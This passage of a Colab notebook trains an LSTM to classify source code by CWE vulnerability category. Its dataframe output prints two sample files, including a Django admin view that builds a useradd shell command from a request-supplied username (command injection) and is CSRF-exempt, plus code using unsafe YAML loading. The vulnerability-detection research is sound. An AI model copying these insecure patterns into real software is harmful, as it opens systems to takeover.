              "          let quickchartButtonEl =\n",
              "            document.querySelector('#df-a4a05eec-628b-4a35-85d5-fa34adff5263 button');\n",
              "          quickchartButtonEl.style.display =\n",
              "            google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "        })();\n",
              "      </script>\n",
              "    </div>\n",
              "\n",
              "    </div>\n",
              "  </div>\n"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "dataframe",
              "summary": "{\n  \"name\": \"    print(\\\"Embedding step failed\",\n  \"rows\": 5,\n  \"fields\": [\n    {\n      \"column\": \"source\",\n      \"properties\": {\n        \"dtype\": \"category\",\n        \"num_unique_values\": 2,\n        \"samples\": [\n          \"\\n\\nfrom libtmux import Server from yaml import load, dump from setupParser import Loader from DepTree import Node, dep_resolve, CircularReferenceException import logging import os import socket import argparse from psutil import Process from subprocess import call from graphviz import Digraph from enum import Enum from time import sleep import sys from PyQt4 import QtGui import hyperGUI FORMAT=\\\"%(asctime)s: %(name)s[%(levelname)s]:\\\\t%(message)s\\\" logging.basicConfig(level=logging.WARNING, format=FORMAT, datefmt='%I:%M:%S') TMP_SLAVE_DIR=\\\"/tmp/Hyperion/slave/components\\\" TMP_COMP_DIR=\\\"/tmp/Hyperion/components\\\" TMP_LOG_PATH=\\\"/tmp/Hyperion/log\\\" BASE_DIR=os.path.dirname(__file__) SCRIPT_CLONE_PATH=(\\\"%s/scripts/start_named_clone_session.sh\\\" % BASE_DIR) class CheckState(Enum): RUNNING=0 STOPPED=1 STOPPED_BUT_SUCCESSFUL=2 STARTED_BY_HAND=3 DEP_FAILED=4 class ControlCenter: def __init__(self, configfile=None): self.logger=logging.getLogger(__name__) self.logger.setLevel(logging.DEBUG) self.configfile=configfile self.nodes={} self.server=[] self.host_list=[] if configfile: self.load_config(configfile) self.session_name=self.config[\\\"name\\\"] with open('debug-result.yml', 'w') as outfile: dump(self.config, outfile, default_flow_style=False) self.logger.debug(\\\"Loading config was successful\\\") self.server=Server() if self.server.has_session(self.session_name): self.session=self.server.find_where({ \\\"session_name\\\": self.session_name }) self.logger.info('found running session by name \\\"%s\\\" on server' % self.session_name) else: self.logger.info('starting new session by name \\\"%s\\\" on server' % self.session_name) self.session=self.server.new_session( session_name=self.session_name, window_name=\\\"Main\\\" ) else: self.config=None def load_config(self, filename=\\\"default.yaml\\\"): with open(filename) as data_file: self.config=load(data_file, Loader) def init(self): if not self.config: self.logger.error(\\\" Config not loaded yet!\\\") else: for group in self.config['groups']: for comp in group['components']: self.logger.debug(\\\"Checking component '%s' in group '%s' on host '%s'\\\" % (comp['name'], group['name'], comp['host'])) if comp['host'] !=\\\"localhost\\\" and not self.run_on_localhost(comp): self.copy_component_to_remote(comp, comp['name'], comp['host']) self.host_list=list(set(self.host_list)) self.set_dependencies(True) def set_dependencies(self, exit_on_fail): for group in self.config['groups']: for comp in group['components']: self.nodes[comp['name']]=Node(comp) master_node=Node({'name': 'master_node'}) for name in self.nodes: node=self.nodes.get(name) master_node.addEdge(node) if \\\"depends\\\" in node.component: for dep in node.component['depends']: if dep in self.nodes: node.addEdge(self.nodes[dep]) else: self.logger.error(\\\"Unmet dependency: '%s' for component '%s'!\\\" %(dep, node.comp_name)) if exit_on_fail: exit(1) self.nodes['master_node']=master_node try: node=self.nodes.get('master_node') res=[] unres=[] dep_resolve(node, res, unres) dep_string=\\\"\\\" for node in res: if node is not master_node: dep_string=\\\"%s -> %s\\\" %(dep_string, node.comp_name) self.logger.debug(\\\"Dependency tree for start all: %s\\\" % dep_string) except CircularReferenceException as ex: self.logger.error(\\\"Detected circular dependency reference between %s and %s!\\\" %(ex.node1, ex.node2)) if exit_on_fail: exit(1) def copy_component_to_remote(self, infile, comp, host): self.host_list.append(host) self.logger.debug(\\\"Saving component to tmp\\\") tmp_comp_path=('%s/%s.yaml' %(TMP_COMP_DIR, comp)) ensure_dir(tmp_comp_path) with open(tmp_comp_path, 'w') as outfile: dump(infile, outfile, default_flow_style=False) self.logger.debug('Copying component \\\"%s\\\" to remote host \\\"%s\\\"' %(comp, host)) cmd=(\\\"ssh %s 'mkdir -p %s' & scp %s %s:%s/%s.yaml\\\" % (host, TMP_SLAVE_DIR, tmp_comp_path, host, TMP_SLAVE_DIR, comp)) self.logger.debug(cmd) send_main_session_command(self.session, cmd) def stop_component(self, comp): if comp['host'] !='localhost' and not self.run_on_localhost(comp): self.logger.debug(\\\"Stopping remote component '%s' on host '%s'\\\" %(comp['name'], comp['host'])) self.stop_remote_component(comp['name'], comp['host']) else: window=find_window(self.session, comp['name']) if window: self.logger.debug(\\\"window '%s' found running\\\" % comp['name']) self.logger.info(\\\"Shutting down window...\\\") kill_window(window) self.logger.info(\\\"... done!\\\") def stop_remote_component(self, comp_name, host): cmd=(\\\"ssh %s 'hyperion --config %s/%s.yaml slave --kill'\\\" %(host, TMP_SLAVE_DIR, comp_name)) self.logger.debug(\\\"Run cmd:\\\\n%s\\\" % cmd) send_main_session_command(self.session, cmd) def start_component(self, comp): node=self.nodes.get(comp['name']) res=[] unres=[] dep_resolve(node, res, unres) for node in res: self.logger.debug(\\\"node name '%s' vs. comp name '%s'\\\" %(node.comp_name, comp['name'])) if node.comp_name !=comp['name']: self.logger.debug(\\\"Checking and starting %s\\\" % node.comp_name) state=self.check_component(node.component) if(state is CheckState.STOPPED_BUT_SUCCESSFUL or state is CheckState.STARTED_BY_HAND or state is CheckState.RUNNING): self.logger.debug(\\\"Component %s is already running, skipping to next in line\\\" % comp['name']) else: self.logger.debug(\\\"Start component '%s' as dependency of '%s'\\\" %(node.comp_name, comp['name'])) self.start_component_without_deps(node.component) tries=0 while True: self.logger.debug(\\\"Checking %s resulted in checkstate %s\\\" %(node.comp_name, state)) state=self.check_component(node.component) if(state is not CheckState.RUNNING or state is not CheckState.STOPPED_BUT_SUCCESSFUL): break if tries > 100: return False tries=tries +1 sleep(.5) self.logger.debug(\\\"All dependencies satisfied, starting '%s'\\\" %(comp['name'])) state=self.check_component(node.component) if(state is CheckState.STARTED_BY_HAND or state is CheckState.RUNNING): self.logger.debug(\\\"Component %s is already running. Skipping start\\\" % comp['name']) else: self.start_component_without_deps(comp) return True def start_component_without_deps(self, comp): if comp['host'] !='localhost' and not self.run_on_localhost(comp): self.logger.debug(\\\"Starting remote component '%s' on host '%s'\\\" %(comp['name'], comp['host'])) self.start_remote_component(comp['name'], comp['host']) else: log_file=(\\\"%s/%s\\\" %(TMP_LOG_PATH, comp['name'])) window=find_window(self.session, comp['name']) if window: self.logger.debug(\\\"Restarting '%s' in old window\\\" % comp['name']) start_window(window, comp['cmd'][0]['start'], log_file, comp['name']) else: self.logger.info(\\\"creating window '%s'\\\" % comp['name']) window=self.session.new_window(comp['name']) start_window(window, comp['cmd'][0]['start'], log_file, comp['name']) def start_remote_component(self, comp_name, host): cmd=(\\\"ssh %s 'hyperion --config %s/%s.yaml slave'\\\" %(host, TMP_SLAVE_DIR, comp_name)) self.logger.debug(\\\"Run cmd:\\\\n%s\\\" % cmd) send_main_session_command(self.session, cmd) def check_component(self, comp): return check_component(comp, self.session, self.logger) def get_dep_list(self, comp): node=self.nodes.get(comp['name']) res=[] unres=[] dep_resolve(node, res, unres) res.remove(node) return res def is_localhost(self, hostname): try: hn_out=socket.gethostbyname(hostname) if hn_out=='127.0.0.1' or hn_out=='::1': self.logger.debug(\\\"Host '%s' is localhost\\\" % hostname) return True else: self.logger.debug(\\\"Host '%s' is not localhost\\\" % hostname) return False except socket.gaierror: sys.exit(\\\"Host '%s' is unknown! Update your /etc/hosts file!\\\" % hostname) def run_on_localhost(self, comp): return self.is_localhost(comp['host']) def kill_remote_session_by_name(self, name, host): cmd=\\\"ssh -t %s 'tmux kill-session -t %s'\\\" %(host, name) send_main_session_command(self.session, cmd) def start_clone_session(self, comp_name, session_name): cmd=\\\"%s '%s' '%s'\\\" %(SCRIPT_CLONE_PATH, session_name, comp_name) send_main_session_command(self.session, cmd) def start_remote_clone_session(self, comp_name, session_name, hostname): remote_cmd=(\\\"%s '%s' '%s'\\\" %(SCRIPT_CLONE_PATH, session_name, comp_name)) cmd=\\\"ssh %s 'bash -s' < %s\\\" %(hostname, remote_cmd) send_main_session_command(self.session, cmd) def draw_graph(self): deps=Digraph(\\\"Deps\\\", strict=True) deps.graph_attr.update(rankdir=\\\"BT\\\") try: node=self.nodes.get('master_node') for current in node.depends_on: deps.node(current.comp_name) res=[] unres=[] dep_resolve(current, res, unres) for node in res: if \\\"depends\\\" in node.component: for dep in node.component['depends']: if dep not in self.nodes: deps.node(dep, color=\\\"red\\\") deps.edge(node.comp_name, dep, \\\"missing\\\", color=\\\"red\\\") elif node.comp_name is not \\\"master_node\\\": deps.edge(node.comp_name, dep) except CircularReferenceException as ex: self.logger.error(\\\"Detected circular dependency reference between %s and %s!\\\" %(ex.node1, ex.node2)) deps.edge(ex.node1, ex.node2, \\\"circular error\\\", color=\\\"red\\\") deps.edge(ex.node2, ex.node1, color=\\\"red\\\") deps.view() class SlaveLauncher: def __init__(self, configfile=None, kill_mode=False, check_mode=False): self.kill_mode=kill_mode self.check_mode=check_mode self.logger=logging.getLogger(__name__) self.logger.setLevel(logging.DEBUG) self.config=None self.session=None if kill_mode: self.logger.info(\\\"started slave with kill mode\\\") if check_mode: self.logger.info(\\\"started slave with check mode\\\") self.server=Server() if self.server.has_session(\\\"slave-session\\\"): self.session=self.server.find_where({ \\\"session_name\\\": \\\"slave-session\\\" }) self.logger.info('found running slave session on server') elif not kill_mode and not check_mode: self.logger.info('starting new slave session on server') self.session=self.server.new_session( session_name=\\\"slave-session\\\" ) else: self.logger.info(\\\"No slave session found on server. Aborting\\\") exit(CheckState.STOPPED) if configfile: self.load_config(configfile) self.window_name=self.config['name'] self.flag_path=(\\\"/tmp/Hyperion/slaves/%s\\\" % self.window_name) self.log_file=(\\\"/tmp/Hyperion/log/%s\\\" % self.window_name) ensure_dir(self.log_file) else: self.logger.error(\\\"No slave component config provided\\\") def load_config(self, filename=\\\"default.yaml\\\"): with open(filename) as data_file: self.config=load(data_file, Loader) def init(self): if not self.config: self.logger.error(\\\" Config not loaded yet!\\\") elif not self.session: self.logger.error(\\\" Init aborted. No session was found!\\\") else: self.logger.debug(self.config) window=find_window(self.session, self.window_name) if window: self.logger.debug(\\\"window '%s' found running\\\" % self.window_name) if self.kill_mode: self.logger.info(\\\"Shutting down window...\\\") kill_window(window) self.logger.info(\\\"... done!\\\") elif not self.kill_mode: self.logger.info(\\\"creating window '%s'\\\" % self.window_name) window=self.session.new_window(self.window_name) start_window(window, self.config['cmd'][0]['start'], self.log_file, self.window_name) else: self.logger.info(\\\"There is no component running by the name '%s'. Exiting kill mode\\\" % self.window_name) def run_check(self): if not self.config: self.logger.error(\\\" Config not loaded yet!\\\") exit(CheckState.STOPPED.value) elif not self.session: self.logger.error(\\\" Init aborted. No session was found!\\\") exit(CheckState.STOPPED.value) check_state=check_component(self.config, self.session, self.logger) exit(check_state.value) def run_component_check(comp): if call(comp['cmd'][1]['check'], shell=True)==0: return True else: return False def check_component(comp, session, logger): logger.debug(\\\"Running component check for %s\\\" % comp['name']) check_available=len(comp['cmd']) > 1 and 'check' in comp['cmd'][1] window=find_window(session, comp['name']) if window: pid=get_window_pid(window) logger.debug(\\\"Found window pid: %s\\\" % pid) procs=[] for entry in pid: procs.extend(Process(entry).children(recursive=True)) pids=[p.pid for p in procs] logger.debug(\\\"Window is running %s child processes\\\" % len(pids)) if len(pids) < 3: logger.debug(\\\"Main window process has finished. Running custom check if available\\\") if check_available and run_component_check(comp): logger.debug(\\\"Process terminated but check was successful\\\") return CheckState.STOPPED_BUT_SUCCESSFUL else: logger.debug(\\\"Check failed or no check available: returning false\\\") return CheckState.STOPPED elif check_available and run_component_check(comp): logger.debug(\\\"Check succeeded\\\") return CheckState.RUNNING elif not check_available: logger.debug(\\\"No custom check specified and got sufficient pid amount: returning true\\\") return CheckState.RUNNING else: logger.debug(\\\"Check failed: returning false\\\") return CheckState.STOPPED else: logger.debug(\\\"%s window is not running. Running custom check\\\" % comp['name']) if check_available and run_component_check(comp): logger.debug(\\\"Component was not started by Hyperion, but the check succeeded\\\") return CheckState.STARTED_BY_HAND else: logger.debug(\\\"Window not running and no check command is available or it failed: returning false\\\") return CheckState.STOPPED def get_window_pid(window): r=window.cmd('list-panes', \\\"-F return[int(p) for p in r.stdout] def kill_session_by_name(server, name): session=server.find_where({ \\\"session_name\\\": name }) session.kill_session() def kill_window(window): window.cmd(\\\"send-keys\\\", \\\"\\\", \\\"C-c\\\") window.kill_window() def start_window(window, cmd, log_file, comp_name): setup_log(window, log_file, comp_name) window.cmd(\\\"send-keys\\\", cmd, \\\"Enter\\\") def find_window(session, window_name): window=session.find_where({ \\\"window_name\\\": window_name }) return window def send_main_session_command(session, cmd): window=find_window(session, \\\"Main\\\") window.cmd(\\\"send-keys\\\", cmd, \\\"Enter\\\") def setup_log(window, file, comp_name): clear_log(file) window.cmd(\\\"send-keys\\\", \\\"exec 2> >(exec tee -i -a '%s')\\\" % file, \\\"Enter\\\") window.cmd(\\\"send-keys\\\", \\\"exec 1> >(exec tee -i -a '%s')\\\" % file, \\\"Enter\\\") window.cmd(\\\"send-keys\\\",('echo \\\" def clear_log(file_path): if os.path.isfile(file_path): os.remove(file_path) def ensure_dir(file_path): directory=os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory) def main(): logger=logging.getLogger(__name__) logger.setLevel(logging.DEBUG) parser=argparse.ArgumentParser() parser.add_argument(\\\"--config\\\", '-c', type=str, default='test.yaml', help=\\\"YAML config file. see sample-config.yaml. Default: test.yaml\\\") subparsers=parser.add_subparsers(dest=\\\"cmd\\\") subparser_editor=subparsers.add_parser('edit', help=\\\"Launches the editor to edit or create new systems and \\\" \\\"components\\\") subparser_run=subparsers.add_parser('run', help=\\\"Launches the setup specified by the --config argument\\\") subparser_val=subparsers.add_parser('validate', help=\\\"Validate the setup specified by the --config argument\\\") subparser_remote=subparsers.add_parser('slave', help=\\\"Run a component locally without controlling it. The \\\" \\\"control is taken care of the remote master invoking \\\" \\\"this command.\\\\nIf run with the --kill flag, the \\\" \\\"passed component will be killed\\\") subparser_val.add_argument(\\\"--visual\\\", help=\\\"Generate and show a graph image\\\", action=\\\"store_true\\\") remote_mutex=subparser_remote.add_mutually_exclusive_group(required=False) remote_mutex.add_argument('-k', '--kill', help=\\\"switch to kill mode\\\", action=\\\"store_true\\\") remote_mutex.add_argument('-c', '--check', help=\\\"Run a component check\\\", action=\\\"store_true\\\") args=parser.parse_args() logger.debug(args) if args.cmd=='edit': logger.debug(\\\"Launching editor mode\\\") elif args.cmd=='run': logger.debug(\\\"Launching runner mode\\\") cc=ControlCenter(args.config) cc.init() start_gui(cc) elif args.cmd=='validate': logger.debug(\\\"Launching validation mode\\\") cc=ControlCenter(args.config) if args.visual: cc.set_dependencies(False) cc.draw_graph() else: cc.set_dependencies(True) elif args.cmd=='slave': logger.debug(\\\"Launching slave mode\\\") sl=SlaveLauncher(args.config, args.kill, args.check) if args.check: sl.run_check() else: sl.init() def start_gui(control_center): app=QtGui.QApplication(sys.argv) main_window=QtGui.QMainWindow() ui=hyperGUI.UiMainWindow() ui.ui_init(main_window, control_center) main_window.show() sys.exit(app.exec_()) \",\n          \"\\nfrom django.shortcuts import render from django.http import HttpResponse, JsonResponse from django.views.decorators.csrf import csrf_exempt from rest_framework.renderers import JSONRenderer from rest_framework.parsers import JSONParser from rest_framework.response import Response from rest_framework import viewsets from rest_framework.decorators import list_route from flask import escape from.models import BoxDetails, RegisteredServices from.serializers import BoxDetailsSerializer, RegisteredServicesSerializer import common, sqlite3, subprocess, NetworkManager, os, crypt, pwd, getpass, spwd nm=NetworkManager.NetworkManager wlans=[d for d in nm.Devices if isinstance(d, NetworkManager.Wireless)] def get_osversion(): \\\"\\\"\\\" PRETTY_NAME of your Titania os(in lowercase). \\\"\\\"\\\" with open(\\\"/etc/os-release\\\") as f: osfilecontent=f.read().split(\\\"\\\\n\\\") version=osfilecontent[4].split('=')[1].strip('\\\\\\\"') return version def get_allconfiguredwifi(): \\\"\\\"\\\" nmcli con | grep 802-11-wireless \\\"\\\"\\\" ps=subprocess.Popen('nmcli -t -f NAME,TYPE conn | grep 802-11-wireless', shell=True,stdout=subprocess.PIPE).communicate()[0] wifirows=ps.split('\\\\n') wifi=[] for row in wifirows: name=row.split(':') print(name) wifi.append(name[0]) return wifi def get_allAPs(): \\\"\\\"\\\" nmcli con | grep 802-11-wireless \\\"\\\"\\\" ps=subprocess.Popen('nmcli -t -f SSID,BARS device wifi list', shell=True,stdout=subprocess.PIPE).communicate()[0] wifirows=ps.split('\\\\n') wifi=[] for row in wifirows: entry=row.split(':') print(entry) wifi.append(entry) return wifi def add_user(username, password): encPass=crypt.crypt(password,\\\"22\\\") os.system(\\\"useradd -G docker,wheel -p \\\"+encPass+\\\" \\\"+username) def add_newWifiConn(wifiname, wifipass): print(wlans) wlan0=wlans[0] print(wlan0) print(wifiname) for dev in wlans: for ap in dev.AccessPoints: if ap.Ssid==wifiname: currentwifi=ap print(currentwifi) params={ \\\"802-11-wireless\\\":{ \\\"security\\\": \\\"802-11-wireless-security\\\", }, \\\"802-11-wireless-security\\\":{ \\\"key-mgmt\\\": \\\"wpa-psk\\\", \\\"psk\\\": wifipass }, } conn=nm.AddAndActivateConnection(params, wlan0, currentwifi) def delete_WifiConn(wifiap): \\\"\\\"\\\" nmcli connection delete id <connection name> \\\"\\\"\\\" ps=subprocess.Popen(['nmcli', 'connection','delete','id',wifiap], stdout=subprocess.PIPE) print(ps) def edit_WifiConn(wifiname, wifipass): ps=subprocess.Popen(['nmcli', 'connection','delete','id',wifiname], stdout=subprocess.PIPE) print(ps) print(wlans) wlan0=wlans[0] print(wlan0) print(wifiname) for dev in wlans: for ap in dev.AccessPoints: if ap.Ssid==wifiname: currentwifi=ap params={ \\\"802-11-wireless\\\":{ \\\"security\\\": \\\"802-11-wireless-security\\\", }, \\\"802-11-wireless-security\\\":{ \\\"key-mgmt\\\": \\\"wpa-psk\\\", \\\"psk\\\": wifipass }, } conn=nm.AddAndActivateConnection(params, wlan0, currentwifi) return @csrf_exempt def handle_config(request): \\\"\\\"\\\" List all code snippets, or create a new snippet. \\\"\\\"\\\" if request.method=='POST': action=request.POST.get(\\\"_action\\\") print(action) if action=='registerService': request_name=request.POST.get(\\\"name\\\") request_address=request.POST.get(\\\"address\\\") request_icon=request.POST.get(\\\"icon\\\") print(request_name) print(request_address) print(request_icon) setServiceDetails=RegisteredServices.objects.get_or_create(name=request_name,address=request_address,icon=request_icon) return JsonResponse({\\\"STATUS\\\":\\\"SUCCESS\\\"}, safe=False) elif action=='getSchema': schema=get_osversion() return JsonResponse({\\\"version_info\\\":schema}, safe=False) elif action=='getIfConfigured': print(action) queryset=BoxDetails.objects.all() serializer=BoxDetailsSerializer(queryset, many=True) return JsonResponse(serializer.data, safe=False) elif action=='loadDependencies': print(action) queryset=RegisteredServices.objects.all() serializer=RegisteredServicesSerializer(queryset, many=True) return JsonResponse(serializer.data, safe=False) elif action=='getAllAPs': wifi_aps=get_allAPs() return JsonResponse(wifi_aps, safe=False) elif action=='saveUserDetails': print(action) boxname=escape(request.POST.get(\\\"boxname\\\")) username=escape(request.POST.get(\\\"username\\\")) password=escape(request.POST.get(\\\"password\\\")) print(username) add_user(username,password) setBoxName=BoxDetails(boxname=boxname) setBoxName.save() wifi_pass=request.POST.get(\\\"wifi_password\\\") wifi_name=request.POST.get(\\\"wifi_ap\\\") if len(wifi_name) > 0: add_newWifiConn(wifi_name,wifi_pass) return JsonResponse({\\\"STATUS\\\":\\\"SUCCESS\\\"}, safe=False) elif action=='login': print(action) username=escape(request.POST.get(\\\"username\\\")) password=escape(request.POST.get(\\\"password\\\")) output='' \\\"\\\"\\\"Tries to authenticate a user. Returns True if the authentication succeeds, else the reason (string) is returned.\\\"\\\"\\\" try: enc_pwd=spwd.getspnam(username)[1] if enc_pwd in[\\\"NP\\\", \\\"!\\\", \\\"\\\", None]: output=\\\"User '%s' has no password set\\\" % username if enc_pwd in[\\\"LK\\\", \\\"*\\\"]: output=\\\"account is locked\\\" if enc_pwd==\\\"!!\\\": output=\\\"password has expired\\\" if crypt.crypt(password, enc_pwd)==enc_pwd: output='' else: output=\\\"incorrect password\\\" except KeyError: output=\\\"User '%s' not found\\\" % username if len(output)==0: return JsonResponse({\\\"username\\\":username}, safe=False) else: return JsonResponse(output, safe=False) elif action=='logout': print(action) username=request.POST.get(\\\"username\\\") print(username+' ') queryset=User.objects.all().first() if username==queryset.username: return JsonResponse({\\\"STATUS\\\":\\\"SUCCESS\\\", \\\"username\\\":queryset.username}, safe=False) elif action=='getDashboardCards': print(action) con=sqlite3.connect(\\\"dashboard.sqlite3\\\") cursor=con.cursor() cursor.execute(common.Q_DASHBOARD_CARDS) rows=cursor.fetchall() print(rows) return JsonResponse(rows, safe=False) elif action=='getDashboardChart': print(action) con=sqlite3.connect(\\\"dashboard.sqlite3\\\") cursor=con.cursor() cursor.execute(common.Q_GET_CONTAINER_ID) rows=cursor.fetchall() print(rows) finalset=[] for row in rows: cursor.execute(common.Q_GET_DASHBOARD_CHART,[row[0],]) datasets=cursor.fetchall() print(datasets) data={'container_name': row[1], 'data': datasets} finalset.append(data) return JsonResponse(finalset, safe=False) elif action=='getDockerOverview': print(action) con=sqlite3.connect(\\\"dashboard.sqlite3\\\") cursor=con.cursor() cursor.execute(common.Q_GET_DOCKER_OVERVIEW) rows=cursor.fetchall() print(rows) finalset=[] for row in rows: data={'state': row[0], 'container_id': row[1], 'name': row[2], 'image': row[3], 'running_for': row[4], 'command': row[5], 'ports': row[6], 'status': row[7], 'networks': row[8]} finalset.append(data) return JsonResponse(finalset, safe=False) elif action=='getContainerStats': print(action) con=sqlite3.connect(\\\"dashboard.sqlite3\\\") cursor=con.cursor() cursor.execute(common.Q_GET_CONTAINER_ID) rows=cursor.fetchall() print(rows) finalset=[] datasets_io=[] datasets_mem=[] datasets_perc=[] for row in rows: datasets_io=[] datasets_mem=[] datasets_perc=[] for iter in range(0,2): cursor.execute(common.Q_GET_CONTAINER_STATS_CPU,[row[0],iter+1]) counter_val=cursor.fetchall() datasets_perc.append(counter_val) for iter in range(2,4): cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1]) counter_val=cursor.fetchall() datasets_mem.append(counter_val) for iter in range(4,8): cursor.execute(common.Q_GET_CONTAINER_STATS,[row[0],iter+1]) counter_val=cursor.fetchall() datasets_io.append(counter_val) data={'container_id': row[0], 'container_name': row[1], 'data_io': datasets_io, 'data_mem': datasets_mem, 'data_perc': datasets_perc} finalset.append(data) return JsonResponse(finalset, safe=False) elif action=='getThreads': print(action) rows=[] ps=subprocess.Popen(['top', '-b','-n','1'], stdout=subprocess.PIPE).communicate()[0] processes=ps.decode().split('\\\\n') nfields=len(processes[0].split()) -1 for row in processes[4:]: rows.append(row.split(None, nfields)) return JsonResponse(rows, safe=False) elif action=='getContainerTop': print(action) con=sqlite3.connect(\\\"dashboard.sqlite3\\\") cursor=con.cursor() cursor.execute(common.Q_GET_CONTAINER_ID) rows=cursor.fetchall() resultset=[] for i in rows: data={} datasets=[] ps=subprocess.Popen(['docker', 'top',i[0]], stdout=subprocess.PIPE).communicate()[0] processes=ps.decode().split('\\\\n') nfields=len(processes[0].split()) -1 for p in processes[1:]: datasets.append(p.split(None, nfields)) data={'container_id': i[0], 'container_name': i[1], 'data': datasets} resultset.append(data) return JsonResponse(resultset, safe=False) elif action=='getSettings': print(action) ps=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\\\n')[0] userlist=ps.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps}], safe=False) elif action=='deleteUser': print(action) username=escape(request.POST.get(\\\"user\\\")) ps=subprocess.Popen(['userdel', username], stdout=subprocess.PIPE).communicate() fetchusers=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\\\n')[0] userlist=fetchusers.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deleteuser', 'endpoint': username}], safe=False) elif action=='addNewUser': print(action) username=escape(request.POST.get(\\\"username\\\")) password=escape(request.POST.get(\\\"password\\\")) add_user(username,password) fetchusers=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\\\n')[0] userlist=fetchusers.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'adduser', 'endpoint': username}], safe=False) elif action=='addWifi': print(action) wifi_pass=escape(request.POST.get(\\\"wifi_password\\\")) wifi_name=request.POST.get(\\\"wifi_ap\\\") if len(wifi_name) > 0: add_newWifiConn(wifi_name,wifi_pass) fetchusers=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\\\n')[0] userlist=fetchusers.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'addwifi', 'endpoint': wifi_name}], safe=False) elif action=='deleteWifi': print(action) wifi_name=request.POST.get(\\\"wifi\\\") delete_WifiConn(wifi_name) fetchusers=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\\\n')[0] userlist=fetchusers.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'deletewifi', 'endpoint': wifi_name}], safe=False) elif action=='editWifi': print(action) wifi_name=request.POST.get(\\\"wifi_ap\\\") wifi_pass=escape(request.POST.get(\\\"wifi_password\\\")) edit_WifiConn(wifi_name,wifi_pass) fetchusers=subprocess.Popen(['grep', '/etc/group','-e','docker'], stdout=subprocess.PIPE).communicate()[0].split('\\\\n')[0] userlist=fetchusers.split(':')[3].split(',') configuredwifi=get_allconfiguredwifi() wifi_aps=get_allAPs() return JsonResponse([{'users':userlist,'wifi':configuredwifi,'allwifiaps':wifi_aps, 'reqtype': 'editwifi', 'endpoint': wifi_name}], safe=False) return JsonResponse(serializer.errors, status=400) def index(request): return render(request, 'index.html') class BoxDetailsViewSet(viewsets.ModelViewSet): queryset=BoxDetails.objects.all() serializer_class=BoxDetailsSerializer class RegisteredServicesViewSet(viewsets.ModelViewSet): queryset=RegisteredServices.objects.all() serializer_class=RegisteredServicesSerializer \"\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"tokenized_source\",\n      \"properties\": {\n        \"dtype\": \"object\",\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"padded_embedded_source\",\n      \"properties\": {\n        \"dtype\": \"object\",\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    }\n  ]\n}"
            }
          },
          "metadata": {}
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 단일 lstm 모델"
      ],
      "metadata": {
        "id": "A1WhsTUtPiNo"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import tensorflow as tf\n",
        "from tensorflow.keras.models import Sequential\n",
        "from tensorflow.keras.layers import LSTM, Dense, Embedding\n",
        "from tensorflow.keras.preprocessing.sequence import pad_sequences\n",
        "from sklearn.model_selection import train_test_split\n",
        "from sklearn.preprocessing import LabelEncoder\n",
        "from tensorflow.keras.utils import to_categorical\n",
        "import numpy as np\n",
        "\n",
        "# Prepare the data for LSTM\n",
        "# Features (X) are the padded embedded sequences\n",
        "X = np.array(df_sample['padded_embedded_source'].tolist())\n",
        "\n",
        "# Labels (y) are the CWE categories\n",
        "y = df_sample['CWE']\n",
        "\n",
        "# 1. Encode the labels to numerical values\n",
        "label_encoder = LabelEncoder()\n",
        "y_encoded = label_encoder.fit_transform(y)\n",
        "\n",
        "# 2. Convert numerical labels to one-hot encoded vectors for multi-class classification\n",
        "y_one_hot = to_categorical(y_encoded)\n",
        "\n",
        "# Determine the number of classes\n",
        "num_classes = y_one_hot.shape[1]\n",
        "\n",
        "# 3. Split the data into training and testing sets\n",
        "X_train, X_test, y_train, y_test = train_test_split(X, y_one_hot, test_size=0.2, random_state=42)\n",
        "\n",
        "# Define model parameters\n",
        "max_sequence_length = X_train.shape[1] # Should be 100 based on previous padding\n",
        "embedding_dim = X_train.shape[2]     # Should be 100 based on Word2Vec model size\n",
        "\n",
        "# 4. Define the LSTM model architecture\n",
        "model = Sequential()\n",
        "# Note: When using pre-trained embeddings directly, you don't use Keras's Embedding layer\n",
        "# The input shape should be (max_sequence_length, embedding_dim)\n",
        "model.add(LSTM(128, input_shape=(max_sequence_length, embedding_dim))) # LSTM layer with 128 units\n",
        "model.add(Dense(num_classes, activation='softmax')) # Output layer with softmax for multi-class classification\n",
        "\n",
        "# 5. Compile the model\n",
        "model.compile(loss='categorical_crossentropy', optimizer='adam', metrics=['accuracy'])\n",
        "\n",
        "# Print model summary\n",
        "model.summary()\n",
        "\n",
        "# 6. Train the model\n",
        "# You can adjust epochs and batch_size as needed\n",
        "history = model.fit(X_train, y_train, epochs=10, batch_size=32, validation_split=0.2)\n",
        "\n",
        "# Evaluate the model on the test set\n",
